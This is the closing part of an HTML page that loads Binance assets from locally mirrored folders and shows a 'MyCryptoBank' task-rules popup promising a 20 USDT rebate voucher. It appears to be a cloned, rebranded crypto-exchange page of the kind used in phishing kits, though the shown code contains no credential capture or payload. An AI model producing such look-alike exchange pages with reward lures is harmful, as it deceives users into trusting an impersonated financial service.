                        "0df3": ["static/css/bfdfa9a1.chunk.css", "static/css/13d1d64d.chunk.css", "static/chunks/layout-0df3.f1189d00.js"],
                        "e2d5": ["static/css/0fe774dd.chunk.css", "static/css/d4b10082.chunk.css", "static/css/bc6cbf4b.chunk.css", "static/chunks/page-e2d5.65548fa5.js"],
                        "af8c": ["static/css/0fe774dd.chunk.css", "static/css/d4b10082.chunk.css", "static/chunks/page-af8c.d32da37b.js"],
                        "9d64": ["static/css/cd328f06.chunk.css", "static/chunks/page-9d64.d98734f0.js"],
                        "f04a": ["static/css/ca9e7b31.chunk.css", "static/chunks/page-f04a.646c7470.js"],
                        "a480": ["static/css/ce26fe0b.chunk.css", "static/chunks/page-a480.d8dc8ac2.js"],
                        "dcf0": ["static/css/0fe774dd.chunk.css", "static/css/d4b10082.chunk.css", "static/css/ad4700fa.chunk.css", "static/chunks/page-dcf0.71b7eb83.js"],
                        "745c": ["static/css/c8e50a80.chunk.css", "static/chunks/page-745c.416c672e.js"]
                    },
                    "publicPath": "./test2/"
                }
            </script>
            <div id="__APP_EXTENSION" style="position: absolute;"></div><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M86QHGF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
            <script id="remote-config" src="./public.bnbstatic.com/unpkg/config/remote-config.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./bin.bnbstatic.com/static/polyfills.d7582762.js" nomodule data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script id="essential-js" src="./public.bnbstatic.com/unpkg/essential/essential@0.3.53.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script id="vendor-umd" src="./public.bnbstatic.com/unpkg/vendor/vendor.umd.0.0.11.production.min.18.2.0.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./bin.bnbstatic.com/static/configs/newbase/common-widget-icon.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/themis/themis@0.0.39.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/vendor@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/utils@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/data@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/common@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./bin.bnbstatic.com/static/webpack-runtime.f6541e92.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./bin.bnbstatic.com/static/common/framework.cb5d2a75.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./bin.bnbstatic.com/static/main.31a0ed8c.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb" fetchpriority="high"></script>
            <script src="./public.bnbstatic.com/unpkg/web-push-odin/web-push-odin-pre.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/header@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/footer@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./public.bnbstatic.com/unpkg/common-widget/extension@1.3.717.min.js" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./bin.bnbstatic.com/static/js/common-widget/versionCheck.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./bin.bnbstatic.com/static/js/common-widget/headerRender.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./bin.bnbstatic.com/static/js/common-widget/footerRender.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
            <script src="./bin.bnbstatic.com/static/js/common-widget/extensionRender.js" data-ot-ignore nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb"></script>
  
    <!-- Rules Popup -->
    <div id="rulesPopup" class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">Task Rules</div>
            <div class="popup-body">
                <h3>Reward</h3>
                <p>Reward: 20 USDT Trading Fee Rebate Voucher (Spot)</p>
                
                <h3>General Rules</h3>
                <p>1. Rewards for this task are limited on a first-come, first-served basis. Once the reward has been fully redeemed, you will be unable to claim the reward. Please keep a look out for the other tasks and rewards.</p>
                <p>2. MyCryptoBank reserves the right to disqualify any participants that, in its reasonable opinion, are acting fraudulently or not in accordance with any applicable terms and conditions.</p>
                <p>3. MyCryptoBank reserves the right at any time in its sole and absolute discretion to determine and/or amend or vary the terms and conditions of this task and reward without prior notice.</p>
                <p>4. Where any discrepancy arises between the translated versions, the English version shall prevail.</p>
                <button class="ok-button" onclick="hideRulesPopup()">OK</button>
            </div>
        </div>
    </div>

    <script>
        function handleDoTask() {
            window.location.href = '';
        }

        function showRulesPopup() {
            document.getElementById('rulesPopup').style.display = 'block';
        }

        function hideRulesPopup() {
            document.getElementById('rulesPopup').style.display = 'none';
        }
    </script>
    <style>
    @media (max-width: 768px) {
     .info-row, .task-content{
      display: block;
     }

     .task-actions{
        margin-top: 12px;
     }
    }
    </style>
</body>

</html>